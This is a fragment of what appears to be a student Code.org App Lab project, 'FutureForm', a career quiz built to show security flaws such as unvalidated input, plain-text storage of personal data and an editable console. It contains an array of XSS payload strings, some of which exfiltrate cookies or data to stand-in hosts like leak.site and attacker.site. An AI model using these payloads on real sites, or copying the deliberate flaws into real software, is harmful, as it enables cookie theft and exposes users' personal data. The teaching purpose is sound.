    "start_blocks": "// ---------- Global Variables ----------\nvar fullName = \"\";\nvar zip = \"\";\nvar birthday = \"\";\nvar salary = \"\";\nvar matchScore = 0;\nvar careerMatch = \"\";\nvar submissionCount = 0;\n\nvar aiCareers = [\n  \"AI Legal Ethicist\",\n  \"Machine Learning Engineer\",\n  \"AI-Powered Healthcare Analyst\",\n  \"AI Ethics Researcher\",\n  \"Prompt Engineer\",\n  \"Autonomous Vehicle Tester\",\n  \"AI Chatbot Designer\",\n  \"Data Bias Auditor\",\n  \"Voice Assistant Developer\",\n  \"AI Art Director\"\n];\n\nvar careerTips = [\n  \"- Stay curious\",\n  \"- Keep learning\",\n  \"- Network early\",\n  \"- Build projects that matter\",\n  \"- Collaborate across fields\",\n  \"- Understand ethics deeply\",\n  \"- Master data interpretation\",\n  \"- Seek mentorship\",\n  \"- Document your process\",\n  \"- Test your assumptions\"\n];\n\nvar fakeScripts = [\n  \"<script>alert('Lunch!')</script>\",\n  \"<script>console.log('stealing cookies')</script>\",\n  \"<script>window.location='http://malicious.site'</script>\",\n  \"<script>while(true){}</script>\",\n  \"<script>document.body.innerHTML='Hacked!'</script>\",\n  \"<script>fetch('http://attacker.site/data')</script>\",\n  \"<script>new Image().src='http://leak.site/?cookie=' + document.cookie</script>\",\n  \"<script>document.title='YOU GOT HACKED'</script>\",\n  \"<script>Object.freeze(document)</script>\",\n  \"<script>document.querySelectorAll('*').forEach(e => e.remove())</script>\"\n];\n\n\n// ---------- SCREEN 1: Quiz Input ----------\nfunction updateQuizConsole() {\n  var output = \"Developer Console\\n-------------------------\\n\\#save(plain_text):\\n\";\n  output += \"Full Name: \" + getText(\"full_name_input\") + \"\\n\";\n  output += \"Zip Code: \" + getText(\"zip_input\") + \"\\n\";\n  output += \"Birthday: \" + getText(\"birthday_input\") + \"\\n\";\n  output += \"Desired Salary: \" + getText(\"salary_input\") + \"\\n\";\n  setText(\"quiz_console\", output);\n}\n\nonEvent(\"full_name_input\", \"input\", updateQuizConsole);\nonEvent(\"zip_input\", \"input\", updateQuizConsole);\nonEvent(\"birthday_input\", \"input\", updateQuizConsole);\nonEvent(\"salary_input\", \"input\", updateQuizConsole);\n\nonEvent(\"submit_quiz\", \"click\", function() {\n  fullName = getText(\"full_name_input\");\n  zip = getText(\"zip_input\");\n  birthday = getText(\"birthday_input\");\n  salary = getText(\"salary_input\");\n\n  var output = \"Developer Console\\n-------------------------\\n\";\n\n  if (fullName === \"\" || zip === \"\" || birthday === \"\" || salary === \"\") {\n    output += \"⚠️ All fields are required.\";\n  } else {\n    output += \"✅ Quiz data recorded.\\n\";\n    output += \"⚠️ No validation applied to inputs.\\n\";\n    output += \"⚠️ Personal data stored in plain text.\";\n    setScreen(\"screen2\");\n    generateCareerResult();\n  }\n  setText(\"quiz_console\", output);\n});\n\n\n// ---------- SCREEN 2: Career Match Result ----------\nfunction generateCareerResult() {\n  matchScore = randomNumber(75, 99);\n  careerMatch = aiCareers[randomNumber(0, aiCareers.length - 1)];\n  var tips = \"\";\n  for (var i = 0; i < 3; i++) {\n    var tipIndex = randomNumber(0, careerTips.length - 1);\n    tips += careerTips[tipIndex] + \"\\n\";\n  }\n\n  setText(\"career_result_title\", careerMatch);\n  setText(\"match_quality_label\", \"Percent Match: \" + matchScore + \"%\");\n  setText(\"career_match_tips\", tips);\n\n  var output = \"Developer Console\\n-------------------------\\n\";\n  output += \"Randomly assigning. . . \\n\";\n  output += \"🎯 Career Match = \" + careerMatch + \"\\n\";\n  output += \"📊 Percent Match = \" + matchScore + \"%\\n\\n\";\n  output += \"⚠️ Developer Console: editable.\";\n\n  setText(\"result_console\", output);\n}\n\nonEvent(\"result_console\", \"input\", function() {\n  var content = getText(\"result_console\");\n  var lines = (\"\" + content).split(\"\\n\");\n  for (var i = 0; i < lines.length; i++) {\n    var line = \"\" + lines[i];\n    if (line.indexOf(\"🎯 Career Match = \") === 0) {\n      careerMatch = line.replace(\"🎯 Career Match = \", \"\").trim();\n      setText(\"career_result_title\", careerMatch);\n    } else if (line.indexOf(\"📊 Percent Match = \") === 0) {\n      var percent = line.replace(\"📊 Percent Match = \", \"\").replace(\"%\", \"\").trim();\n      matchScore = Number(percent);\n      setText(\"match_quality_label\", \"Percent Match = \" + matchScore + \"%\");\n    }\n  }\n});\n\nonEvent(\"retake_button\", \"click\", function() {\n  setScreen(\"screen1\");\n});\n\nonEvent(\"share_result_button\", \"click\", function() {\n  setScreen(\"screen3\");\n  setText(\"send_job_label\", careerMatch);\n  setText(\"send_percent_match_label\", \"Percent Match = \" + matchScore + \"%\");\n});\n\n\n\n// ---------- SCREEN 3: Share Result ----------\nonEvent(\"share_button\", \"click\", function() {\n  var recipient = getText(\"recipient_input\");\n  var notes = getText(\"share_message_input\");\n  submissionCount++;\n\n  var payload = {\n    name: fullName,\n    career: careerMatch,\n    matchScore: matchScore,\n    zip: zip,\n    birthday: birthday,\n    desiredSalary: salary,\n    notes: notes + \"\\n\" + fakeScripts[randomNumber(0, fakeScripts.length - 1)]\n  };\n\n  var pretty = JSON.stringify(payload, null, 2);\n  var output = \"Developer Console\\n-------------------------\\n\";\n  output += \"📤 Sending result to: \" + recipient + \"\\n\\n\";\n  output += pretty + \"\\n\\n\";\n  output += \"⚠️ Includes sensitive personal data.\";\n\n  if (notes.length > 100) {\n    output += \"\\n⚠️ Notes field exceeds recommended length.\";\n  }\n  output += \"\\n⚠️ Possible code injection detected in notes.\";\n  var randomScript = fakeScripts[randomNumber(0, fakeScripts.length - 1)];\n  output += \"\\nAttack Detected: \" + randomScript;\n\n  output += \"\\n⚠️ Submission #\" + submissionCount + \" — no rate limit detected.\";\n  setText(\"share_console\", output);\n});\n\nonEvent(\"back_to_result_button\", \"click\", function() {\n  setScreen(\"screen2\");\n});\n\n",
    "bubble_choice_description": "An app designed to take you on a journey into the future-- suggesting personalized careers based on your interests and data.",
    "display_name": "FutureForm",
    "thumbnail_url": "https://images.code.org/0b3e596c288bb7d0787b11879bf0fb61-FutureForm_b.png",
